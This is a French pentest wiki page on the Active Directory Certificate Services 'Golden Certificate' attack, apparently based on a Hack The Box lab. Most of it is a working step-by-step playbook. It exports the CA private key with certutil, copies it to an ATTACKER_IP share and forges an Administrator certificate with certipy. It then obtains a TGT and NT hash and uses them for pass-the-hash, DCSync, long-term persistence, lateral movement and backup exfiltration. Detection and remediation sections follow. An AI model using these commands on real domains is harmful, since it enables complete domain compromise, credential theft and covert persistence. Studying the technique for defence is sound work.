# Golden Certificate

### <mark style="color:red;">Golden Certificate Attack</mark>

#### <mark style="color:green;">📋 Description</mark>

Le **Golden Certificate** est l'équivalent du Golden Ticket mais pour AD CS. En compromettant la **clé privée de l'autorité de certification racine**, un attaquant peut forger des certificats valides pour **n'importe quel utilisateur** du domaine, y compris les comptes privilégiés.

#### <mark style="color:green;">🎯 Prérequis</mark>

* Accès au Domain Controller (avec SeManageVolumePrivilege ou autre)
* Connaissance du numéro de série du certificat CA
* Outil certipy-ad

#### <mark style="color:green;">🔍 Détection de l'opportunité</mark>

```bash
# Scanner l'environnement AD CS
certipy find -u USER -p PASSWORD -target DOMAIN -ns DC_IP

# Identifier le certificat CA
# Output :
# Certificate Authorities
#   0
#     CA Name                   : Certificate-LTD-CA
#     Certificate Serial Number : 75B2F4BBF31F108945147B466131BDCA
#     ...
```

#### <mark style="color:green;">⚔️ Exploitation</mark>

**Étape 1 : Énumérer les certificats locaux**

```powershell
# Sur le Domain Controller (avec Evil-WinRM)
certutil -store My

# Output :
# ================ Certificate 0 ================
# Serial Number: 75b2f4bbf31f108945147b466131bdca
# Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
# Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
# Template: CA, Root Certification Authority
# Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
# Key Container = Certificate-LTD-CA
```

**Points critiques à noter :**

* `Template: CA` → C'est bien un certificat d'autorité de certification
* `Root Certification Authority` → C'est la racine
* La clé privée est stockée localement dans le conteneur

**Étape 2 : Exporter le certificat avec sa clé privée**

```powershell
# Exporter au format PFX (contient la clé privée)
certutil -exportPFX My SERIAL_NUMBER output.pfx

# Exemple :
certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca ca.pfx

# Le système demande un mot de passe (laisser vide ou définir un)
# Enter new password for output file ca.pfx:
# Enter new password: [ENTER]
# Confirm new password: [ENTER]

# Output :
# CertUtil: -exportPFX command completed successfully.
```

**⚠️ Pourquoi ça fonctionne ?** La clé privée du CA est exportable par défaut si :

1. L'utilisateur a les droits d'accès au système (via SeManageVolumePrivilege)
2. Le certificat a été créé avec `ExportableKey` flag
3. L'utilisateur peut accéder au store de certificats

**Étape 3 : Télécharger le certificat CA**

```powershell
# Avec Evil-WinRM
download ca.pfx

# Avec SMB
copy ca.pfx \\ATTACKER_IP\share\
```

**Étape 4 : Forger un certificat pour Administrator**

```bash
# Sur la machine attaquante
certipy forge -ca-pfx ca.pfx \
  -upn Administrator@DOMAIN.HTB \
  -subject 'CN=ADMINISTRATOR,CN=USERS,DC=DOMAIN,DC=HTB' \
  -out golden_cert.pfx

# Output :
# Certipy v5.0.2 - by Oliver Lyak (ly4k)
# [*] Saving forged certificate and private key to 'golden_cert.pfx'
# [*] Wrote forged certificate and private key to 'golden_cert.pfx'
```

**Paramètres importants :**

* `-ca-pfx` : Le certificat CA volé
* `-upn` : User Principal Name de la cible (Administrator@domain.htb)
* `-subject` : Distinguished Name complet (doit correspondre à l'AD)

**Étape 5 : S'authentifier avec le certificat forgé**

```bash
# Obtenir un TGT et le hash NTLM
certipy auth -pfx golden_cert.pfx -dc-ip DC_IP

# Output :
# [*] Certificate identities:
# [*]     SAN UPN: 'Administrator@certificate.htb'
# [*] Using principal: 'administrator@certificate.htb'
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saving credential cache to 'administrator.ccache'
# [*] Wrote credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

**Étape 6 : Utiliser les credentials**

```bash
# Méthode 1 : Avec le ticket Kerberos
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass DOMAIN.HTB/Administrator@DC.DOMAIN.HTB

# Méthode 2 : Avec le hash NTLM
evil-winrm -i DC.DOMAIN.HTB -u Administrator -H d804304519bf0143c14cbf1c024408c6

# Méthode 3 : DCSync pour dumper tous les hashes
secretsdump.py DOMAIN/Administrator@DC_IP -hashes :d804304519bf0143c14cbf1c024408c6
```

#### <mark style="color:green;">🧠 Principe technique détaillé</mark>

**Structure d'un certificat PKI**

```
Certificate = {
    Version
    Serial Number
    Signature Algorithm
    Issuer DN              ← Qui a signé (CA)
    Validity Period
    Subject DN             ← Pour qui (utilisateur)
    Public Key
    Extensions {
        Subject Alternative Name (SAN)
        Extended Key Usage
        ...
    }
}
Signature = Sign(Certificate_Data, CA_Private_Key)
```

**Processus de forgery**

```
1. Lire ca.pfx
   ├── Certificat CA public
   └── Clé privée CA ← LA CLÉ CRITIQUE

2. Créer un nouveau certificat
   ├── Subject: CN=Administrator,...
   ├── SAN: Administrator@domain.htb
   └── Extended Key Usage: Client Authentication

3. Signer avec la clé privée CA volée
   └── Signature = Sign(Nouveau_Certificat, CA_Private_Key)

4. Résultat : Certificat valide indiscernable d'un légitime
```

**Validation par le DC**

```
Client présente le certificat forgé
        ↓
DC vérifie la signature avec le certificat public CA
        ↓
Signature valide ✓ (car signée avec la vraie clé privée)
        ↓
DC extrait l'identité du SAN: Administrator@domain.htb
        ↓
DC émet un TGT Kerberos pour Administrator
        ↓
Accès complet au domaine
```

#### <mark style="color:green;">🔬 Variantes avancées</mark>

**Variante 1 : Certificat avec durée de validité étendue**

```bash
certipy forge -ca-pfx ca.pfx \
  -upn Administrator@domain.htb \
  -subject 'CN=ADMINISTRATOR,CN=USERS,DC=DOMAIN,DC=HTB' \
  -validity-period 3650 \  # 10 ans au lieu de 1 an
  -out long_lived.pfx
```

**Variante 2 : Certificat pour un compte de service**

```bash
# Forger pour un compte GMSA ou service account
certipy forge -ca-pfx ca.pfx \
  -upn svc_backup@domain.htb \
  -subject 'CN=svc_backup,OU=ServiceAccounts,DC=DOMAIN,DC=HTB' \
  -out svc_backup_golden.pfx
```

**Variante 3 : Certificat wildcard (si supporté)**

```bash
certipy forge -ca-pfx ca.pfx \
  -upn "*@domain.htb" \
  -subject 'CN=*,DC=DOMAIN,DC=HTB' \
  -out wildcard.pfx
# Note : Généralement bloqué par les contrôles AD
```

#### <mark style="color:green;">⚠️ Persistance</mark>

**Pourquoi Golden Certificate est supérieur à Golden Ticket**

| Aspect      | Golden Ticket           | Golden Certificate              |
| ----------- | ----------------------- | ------------------------------- |
| Dépendance  | Hash krbtgt             | Clé privée CA                   |
| Validité    | Max 10h (renouvelable)  | Années (défini dans le cert)    |
| Révocation  | Changement krbtgt       | Révocation CA nécessaire        |
| Détection   | Logs Kerberos anormaux  | Indétectable (signature valide) |
| Persistence | Perdue si krbtgt change | Persiste même après reset       |

**Maintenir l'accès**

```bash
# Forger plusieurs certificats pour différents comptes
for user in Administrator "Domain Admin" krbtgt; do
    certipy forge -ca-pfx ca.pfx \
      -upn "$user@domain.htb" \
      -subject "CN=$user,CN=USERS,DC=DOMAIN,DC=HTB" \
      -out "${user}_golden.pfx"
done

# Stocker les certificats dans un endroit sûr
# Ils restent valides tant que la CA n'est pas compromise ET révoquée
```

#### <mark style="color:green;">🔍 Détection (Côté Blue Team)</mark>

**Indicateurs de compromission**

```powershell
# 1. Export de certificat CA inhabituel
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4887  # Certificate Services exported a CA certificate
} | Select-Object TimeCreated, Message

# 2. Émission de certificats avec durées inhabituelles
Get-WinEvent -LogName 'Microsoft-Windows-CertificationAuthority/Operational' |
    Where-Object { $_.Id -eq 4886 } |  # Certificate issued
    Select-Object TimeCreated, Message

# 3. Vérifier les certificats avec longue validité
certutil -view -restrict "ValidityPeriod>365" csv > long_certs.csv

# 4. Monitorer les accès au key container de la CA
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4663  # Object access
} | Where-Object {
    $_.Message -like "*Certificate-LTD-CA*"
}
```

**Analyse forensique**

```powershell
# Vérifier si la clé privée CA a été exportée
certutil -store My -v | findstr "ExportableKey"

# Lister tous les certificats émis récemment
certutil -view -restrict "RequestDisposition=20" csv > issued_certs.csv

# Comparer avec les demandes légitimes
# Chercher les anomalies :
# - Subject DN inhabituels
# - Émissions en dehors des heures ouvrables
# - Validité anormalement longue
```

#### <mark style="color:green;">🛡️ Prévention</mark>

**Protection de la clé privée CA**

```powershell
# 1. Utiliser un HSM (Hardware Security Module)
# La clé privée ne peut jamais être exportée

# 2. Configurer le template CA avec ExportableKey = FALSE
# Dans Certificate Authority MMC :
# Right-click template > Properties > Request Handling
# [ ] Make private key exportable

# 3. Restreindre l'accès physique/logique au serveur CA
# ACL strictes sur le serveur
icacls "C:\ProgramData\Microsoft\Crypto\Keys" /inheritance:r
icacls "C:\ProgramData\Microsoft\Crypto\Keys" /grant "SYSTEM:(OI)(CI)F"
icacls "C:\ProgramData\Microsoft\Crypto\Keys" /grant "Administrators:(OI)(CI)F"

# 4. Activer le CRL (Certificate Revocation List)
# Publier régulièrement les CRLs
certutil -CRL

# 5. Implémenter OCSP (Online Certificate Status Protocol)
# Pour vérification en temps réel de la validité des certificats
```

**Monitoring continu**

```powershell
# Script de surveillance (à exécuter périodiquement)
$script = @'
$events = Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4887,4888,4890  # Exports/imports CA cert
    StartTime=(Get-Date).AddHours(-1)
}

if ($events) {
    Send-MailMessage -To "security@company.com" `
        -From "ca-monitor@company.com" `
        -Subject "ALERT: CA Certificate Export Detected" `
        -Body ($events | Format-List | Out-String) `
        -SmtpServer "smtp.company.com"
}
'@

# Planifier avec Task Scheduler
Register-ScheduledTask -TaskName "CA-Monitor" `
    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)) `
    -Action (New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"$script`"")
```

**Réponse à incident**

Si la clé privée CA est compromise :

```powershell
# 1. IMMÉDIAT : Isoler le serveur CA
Disable-NetAdapter -Name "*" -Confirm:$false

# 2. Révoquer TOUS les certificats émis depuis la date de compromission
certutil -revoke SERIAL_NUMBER 1  # 1 = Key Compromise

# 3. Publier une CRL d'urgence
certutil -CRL

# 4. Créer une NOUVELLE autorité de certification
# - Générer une nouvelle paire de clés
# - Émettre un nouveau certificat racine
# - Distribuer aux clients via GPO

# 5. RÉVOQUER l'ancienne CA
# Dans PKI MMC : Right-click CA > All Tasks > Revoke CA Certificate

# 6. Audit forensique complet
# - Identifier tous les certificats forgés
# - Tracer les actions de l'attaquant
# - Documenter pour le rapport d'incident
```

#### <mark style="color:green;">🎯 Cas d'usage offensif</mark>

**Scénario 1 : Persistence post-compromission**

```bash
# Après avoir obtenu DA, forger un Golden Certificate
# pour maintenir l'accès même après remediation

certipy forge -ca-pfx ca.pfx -upn Administrator@domain.htb -out persistence.pfx
# Stocker persistence.pfx dans un endroit sûr externe
# Revenir des mois plus tard avec le même certificat
```

**Scénario 2 : Mouvement latéral discret**

```bash
# Au lieu de Pass-the-Hash (bruyant), utiliser des certificats
for server in $(cat servers.txt); do
    certipy forge -ca-pfx ca.pfx -upn "admin@$server" -out "${server}_admin.pfx"
    certipy auth -pfx "${server}_admin.pfx" -dc-ip $DC
done
```

**Scénario 3 : Exfiltration de données**

```bash
# Forger un certificat pour un compte de service de backup
certipy forge -ca-pfx ca.pfx -upn svc_backup@domain.htb -out backup.pfx
certipy auth -pfx backup.pfx -dc-ip $DC

# Utiliser les credentials pour accéder aux systèmes de backup
smbclient //backup-server/backups -U "DOMAIN/svc_backup%:HASH"
```

#### <mark style="color:green;">📊 Comparaison des attaques de persistence AD</mark>

| Technique              | Durée      | Détectabilité   | Résilience             | Complexité  |
| ---------------------- | ---------- | --------------- | ---------------------- | ----------- |
| Golden Ticket          | 10h-10j    | Moyenne         | Faible (reset krbtgt)  | Faible      |
| Silver Ticket          | Variable   | Faible          | Faible (reset service) | Faible      |
| **Golden Certificate** | **Années** | **Très faible** | **Très élevée**        | **Moyenne** |
| Skeleton Key           | Session    | Élevée          | Faible (reboot)        | Faible      |
| DCSync + cache         | Permanent  | Élevée          | Moyenne                | Faible      |
| AdminSDHolder          | Permanent  | Moyenne         | Élevée                 | Moyenne     |

#### 📚 Références

* [Certipy Documentation](https://github.com/ly4k/Certipy)
* [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [Golden Certificate - Threat Hunter Playbook](https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-201009183000.html)
* [Microsoft PKI Best Practices](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ff404235\(v=ws.10\))
